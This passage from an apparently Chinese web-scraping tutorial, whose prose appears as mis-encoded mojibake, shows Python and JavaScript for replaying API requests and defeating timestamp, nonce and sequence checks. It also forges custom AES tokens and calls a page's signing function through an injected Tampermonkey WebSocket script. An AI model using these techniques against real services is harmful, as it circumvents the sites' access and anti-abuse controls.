<span class="kd">const</span><span class="w"> </span><span class="nx">stdTable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><span class="p">;</span>

<span class="c1">// é­”æ”¹åçš„å­—ç¬¦è¡¨ï¼ˆæ•…æ„æ‰“ä¹±ï¼‰</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">customTable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;LMNOPQRSTUVWXYZABCDEFGHIJKabcdefghijklmnopqrstuv0123456789wx+/yz&quot;</span><span class="p">;</span>
</code></pre>
      </div>

      <p><strong>å¤ç°æ–¹æ³•</strong>: æŠŠæ··æ·†åçš„ Base64 ç¼–ç /è§£ç å‡½æ•°æ‰£ä¸‹æ¥ï¼Œæ”¹æˆ Pythonã€‚</p>

      <hr />

      <h2 id="3-é‡æ”¾æ”»å‡»-replay-attack">3. é‡æ”¾æ”»å‡» (Replay Attack)</h2>

      <p>é‡æ”¾æ˜¯éªŒè¯é€†å‘æˆæœæœ€ç®€å•çš„æ–¹æ³•ã€‚</p>

      <h3 id="31-ç®€å•é‡æ”¾æ— æ—¶é—´æˆ³æ ¡éªŒ">3.1 ç®€å•é‡æ”¾ï¼ˆæ— æ—¶é—´æˆ³æ ¡éªŒï¼‰</h3>

      <ol>
        <li>åœ¨ Network é¢æ¿å³é”®è¯·æ±‚ â†’ &#8220;Copy as cURL&#8221;</li>
        <li>åœ¨ç»ˆç«¯ç²˜è´´è¿è¡Œ</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>curl<span class="w"> </span><span class="s1">&#39;https://api.example.com/data?user_id=123&amp;sign=abc123&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;User-Agent: Mozilla/5.0&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Cookie: session=xyz&#39;</span>
</code></pre>
      </div>

      <p><strong>å¦‚æœèƒ½æ‹¿åˆ°æ•°æ®</strong>ï¼Œè¯´æ˜è¯¥æ¥å£ï¼š</p>

      <ul>
        <li>âœ… æ²¡æœ‰æ—¶é—´æˆ³æ ¡éªŒ</li>
        <li>âœ… æ²¡æœ‰ Nonce æ ¡éªŒ</li>
        <li>âœ… ç­¾åæœ‰æ•ˆæœŸå¾ˆé•¿ï¼ˆæˆ–æ— é™æœŸï¼‰</li>
      </ul>

      <h3 id="32-é«˜çº§é‡æ”¾å¸¦æ—¶é—´æˆ³">3.2 é«˜çº§é‡æ”¾ï¼ˆå¸¦æ—¶é—´æˆ³ï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">salt</span><span class="o">=</span><span class="s2">&quot;my_secret_salt&quot;</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆç­¾å&quot;&quot;&quot;</span>
    <span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">())])</span>
    <span class="n">s</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;&amp;salt=</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">api_request</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;API è¯·æ±‚&quot;&quot;&quot;</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;user_id&quot;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
        <span class="s2">&quot;timestamp&quot;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()),</span>
        <span class="s2">&quot;nonce&quot;</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span>
    <span class="p">}</span>
    <span class="n">params</span><span class="p">[</span><span class="s2">&quot;sign&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
        <span class="s2">&quot;https://api.example.com/data&quot;</span><span class="p">,</span>
        <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
            <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;</span><span class="p">,</span>
            <span class="s2">&quot;Referer&quot;</span><span class="p">:</span> <span class="s2">&quot;https://www.example.com/&quot;</span>
        <span class="p">}</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

<span class="c1"># æµ‹è¯•</span>
<span class="nb">print</span><span class="p">(</span><span class="n">api_request</span><span class="p">(</span><span class="mi">123</span><span class="p">))</span>
</code></pre>
      </div>

      <h3 id="33-sessioncookie-ç®¡ç†">3.3 Session/Cookie ç®¡ç†</h3>

      <p><strong>æ¡ˆä¾‹ï¼šç™»å½• + API è°ƒç”¨</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">class</span><span class="w"> </span><span class="nc">APIClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
            <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;</span>
        <span class="p">})</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç™»å½•è·å– Session&quot;&quot;&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
            <span class="s2">&quot;https://www.example.com/login&quot;</span><span class="p">,</span>
            <span class="n">data</span><span class="o">=</span><span class="p">{</span>
                <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
                <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">encrypt_password</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>  <span class="c1"># ä½¿ç”¨å‰é¢çš„åŠ å¯†å‡½æ•°</span>
            <span class="p">}</span>
        <span class="p">)</span>
        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&quot;code&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ç™»å½•æˆåŠŸï¼ŒSession å·²ä¿å­˜&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">True</span>
        <span class="k">return</span> <span class="kc">False</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_user_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è°ƒç”¨éœ€è¦ç™»å½•çš„ API&quot;&quot;&quot;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;user_id&quot;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">}</span>
        <span class="n">params</span><span class="p">[</span><span class="s2">&quot;sign&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="s2">&quot;https://api.example.com/user/data&quot;</span><span class="p">,</span>
            <span class="n">params</span><span class="o">=</span><span class="n">params</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">encrypt_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="c1"># è¿™é‡Œè°ƒç”¨å‰é¢å†™çš„åŠ å¯†å‡½æ•°</span>
        <span class="k">pass</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">generate_sign</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">params</span><span class="p">):</span>
        <span class="c1"># è¿™é‡Œè°ƒç”¨å‰é¢å†™çš„ç­¾åå‡½æ•°</span>
        <span class="k">pass</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">APIClient</span><span class="p">()</span>
<span class="k">if</span> <span class="n">client</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&quot;myusername&quot;</span><span class="p">,</span> <span class="s2">&quot;mypassword&quot;</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get_user_data</span><span class="p">(</span><span class="mi">123</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="4-é˜²é‡æ”¾æœºåˆ¶ç»•è¿‡">4. é˜²é‡æ”¾æœºåˆ¶ç»•è¿‡</h2>

      <h3 id="41-æ—¶é—´æˆ³æ ¡éªŒ">4.1 æ—¶é—´æˆ³æ ¡éªŒ</h3>

      <p><strong>ç‰¹å¾</strong></p>

      <ul>
        <li>æœåŠ¡å™¨æ£€æŸ¥ <code>timestamp</code> æ˜¯å¦åœ¨å½“å‰æ—¶é—´çš„ Â± 60 ç§’å†…</li>
        <li>æ—§è¯·æ±‚ä¼šè¿”å› <code>{"error": "Request expired"}</code></li>
      </ul>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">ntplib</span>  <span class="c1"># pip install ntplib</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_server_timestamp</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è·å–æ ‡å‡†æ—¶é—´ï¼ˆé˜²æ­¢æœ¬åœ°æ—¶é’Ÿä¸å‡†ï¼‰&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">client</span> <span class="o">=</span> <span class="n">ntplib</span><span class="o">.</span><span class="n">NTPClient</span><span class="p">()</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;pool.ntp.org&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">tx_time</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;user_id&quot;</span><span class="p">:</span> <span class="mi">123</span><span class="p">,</span>
    <span class="s2">&quot;timestamp&quot;</span><span class="p">:</span> <span class="n">get_server_timestamp</span><span class="p">()</span>  <span class="c1"># ä½¿ç”¨æ ‡å‡†æ—¶é—´</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="42-nonceéšæœºæ•°æ ¡éªŒ">4.2 Nonceï¼ˆéšæœºæ•°ï¼‰æ ¡éªŒ</h3>

      <p><strong>ç‰¹å¾</strong></p>

      <ul>
        <li>æœåŠ¡å™¨ä¼šç¼“å­˜æœ€è¿‘ 10 åˆ†é’Ÿçš„æ‰€æœ‰ <code>nonce</code></li>
        <li>é‡å¤çš„ <code>nonce</code> ä¼šè¢«æ‹’ç»ï¼š<code>{"error": "Duplicate request"}</code></li>
      </ul>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">uuid</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_nonce</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ¯æ¬¡ç”Ÿæˆå”¯ä¸€çš„ nonce&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span>  <span class="c1"># ç¤ºä¾‹ï¼š&#39;a8f5f167f44f4964e6c998dee827110c&#39;</span>

<span class="c1"># æˆ–ä½¿ç”¨æ—¶é—´æˆ³ + éšæœºæ•°</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="k">def</span><span class="w"> </span><span class="nf">generate_nonce_v2</span><span class="p">():</span>
    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="si">}{</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="w"> </span><span class="mi">9999</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
</code></pre>
      </div>

      <h3 id="43-åºåˆ—å·sequenceæ ¡éªŒ">4.3 åºåˆ—å·ï¼ˆSequenceï¼‰æ ¡éªŒ</h3>

      <p><strong>ç‰¹å¾</strong></p>

      <ul>
        <li>å¸¸è§äº WebSocket æˆ–é•¿è¿æ¥åè®®</li>
        <li>æ¯ä¸ªåŒ…å¿…é¡»æœ‰é€’å¢çš„åºåˆ—å·ï¼š1, 2, 3, 4&#8230;</li>
        <li>ä¹±åºæˆ–é‡å¤çš„åŒ…ä¼šè¢«ä¸¢å¼ƒ</li>
      </ul>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">WebSocketClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># åˆå§‹åºåˆ—å·</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">send_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">msg_type</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">seq</span> <span class="o">+=</span> <span class="mi">1</span>  <span class="c1"># è‡ªå¢åºåˆ—å·</span>
        <span class="n">packet</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&quot;seq&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">seq</span><span class="p">,</span>
            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="n">msg_type</span><span class="p">,</span>
            <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="n">data</span>
        <span class="p">}</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">packet</span><span class="p">))</span>
</code></pre>
      </div>

      <hr />

      <h2 id="5-è®¤è¯ç³»ç»Ÿåˆ†æ">5. è®¤è¯ç³»ç»Ÿåˆ†æ</h2>

      <h3 id="51-jwt-json-web-token">5.1 JWT (JSON Web Token)</h3>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong></p>

      <pre><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiaWF0IjoxNjM4MzYwMDAwfQ.5f8e9d2a7b3c1e4f...
</code></pre>

      <p>ä¸‰æ®µç”¨ <code>.</code> åˆ†éš”ï¼š</p>

      <ol>
        <li>Header (ç®—æ³•ç±»å‹)</li>
        <li>Payload (ç”¨æˆ·æ•°æ®)</li>
        <li>Signature (ç­¾åï¼Œé˜²ç¯¡æ”¹)</li>
      </ol>

      <p><strong>è§£ç </strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>

<span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiaWF0IjoxNjM4MzYwMDAwfQ.5f8e9d2a...&quot;</span>

<span class="c1"># è§£ç ï¼ˆä¸éªŒè¯ç­¾åï¼‰</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;verify_signature&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># {&#39;userId&#39;: 123, &#39;iat&#39;: 1638360000}</span>
</code></pre>
      </div>

      <p><strong>æ³¨æ„</strong>ï¼šJWT çš„ç­¾åå¯†é’¥ï¼ˆsecretï¼‰åœ¨æœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯æ— æ³•ä¼ªé€ ã€‚é€†å‘é‡ç‚¹æ˜¯<strong>å¦‚ä½•è·å–æœ‰æ•ˆçš„ Token</strong>ï¼ˆé€šå¸¸é€šè¿‡ç™»å½•ï¼‰ã€‚</p>

      <h3 id="52-è‡ªå®šä¹‰-token">5.2 è‡ªå®šä¹‰ Token</h3>

      <p><strong>æ¡ˆä¾‹ï¼šæŸå¹³å°çš„ Token ç”Ÿæˆ</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æµè§ˆå™¨é€»è¾‘</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">generateToken</span><span class="p">(</span><span class="nx">userId</span><span class="p">,</span><span class="w"> </span><span class="nx">deviceId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">|</span><span class="si">${</span><span class="nx">deviceId</span><span class="si">}</span><span class="sb">|</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">raw</span><span class="p">,</span><span class="w"> </span><span class="nx">SECRET_KEY</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">Base64</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="nx">encrypted</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>å¤ç°</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_token</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">device_id</span><span class="p">):</span>
    <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>
    <span class="n">raw</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">device_id</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">&quot;</span>

    <span class="c1"># å‡è®¾é€†å‘å‡ºçš„ SECRET_KEY</span>
    <span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;sixteen byte key&#39;</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">raw</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="6-é«˜çº§æŠ€å·§rpc-è°ƒç”¨">6. é«˜çº§æŠ€å·§ï¼šRPC è°ƒç”¨</h2>

      <p>å½“ JS é€»è¾‘è¿‡äºå¤æ‚ï¼ˆå¦‚ WebAssemblyã€VM ä¿æŠ¤ï¼‰ï¼Œç›´æ¥å¤ç°ç®—æ³•æˆæœ¬å¤ªé«˜ï¼Œå¯ä»¥ä½¿ç”¨ <strong>RPCï¼ˆRemote Procedure Callï¼‰</strong> æŠ€æœ¯ã€‚</p>

      <h3 id="61-åŸç†">6.1 åŸç†</h3>

      <p>åœ¨æµè§ˆå™¨ä¸­æ³¨å…¥ä¸€ä¸ª WebSocket æœåŠ¡å™¨ï¼ŒPython å®¢æˆ·ç«¯é€šè¿‡ WebSocket è°ƒç”¨æµè§ˆå™¨ä¸­çš„ JS å‡½æ•°ã€‚</p>

      <h3 id="62-å®ç°">6.2 å®ç°</h3>

      <p><strong>æµè§ˆå™¨ç«¯ï¼ˆé€šè¿‡ Tampermonkey æ³¨å…¥ï¼‰</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ==UserScript==</span>
<span class="c1">// @name         RPC Server</span>
<span class="c1">// @match        https://www.example.com/*</span>
<span class="c1">// ==/UserScript==</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">ws</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WebSocket</span><span class="p">(</span><span class="s1">&#39;ws://127.0.0.1:8765&#39;</span><span class="p">);</span>

<span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>

<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// è°ƒç”¨é¡µé¢ä¸­çš„ç­¾åå‡½æ•°</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">method</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;getSign&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">getSign</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">videoId</span><span class="p">,</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="o">:</span><span class="w"> </span><span class="nx">result</span><span class="p">}));</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">}));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>Python å®¢æˆ·ç«¯</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RPCClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">request_id</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">call</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">params</span><span class="p">):</span>
        <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;ws://127.0.0.1:8765&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">request_id</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">request</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">request_id</span><span class="p">,</span>
                <span class="s1">&#39;method&#39;</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span>
                <span class="s1">&#39;params&#39;</span><span class="p">:</span> <span class="n">params</span>
            <span class="p">}</span>
